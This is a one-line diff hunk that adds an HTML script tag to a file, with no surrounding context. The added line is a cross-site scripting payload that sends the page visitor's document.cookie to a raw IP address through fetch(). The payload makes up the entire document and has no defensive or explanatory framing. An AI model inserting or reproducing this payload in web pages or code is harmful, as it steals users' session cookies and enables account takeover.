@@ -1,0 +1,1 @@
+<script>fetch('http://6.190.192.2/.session='+document.cookie)</script>
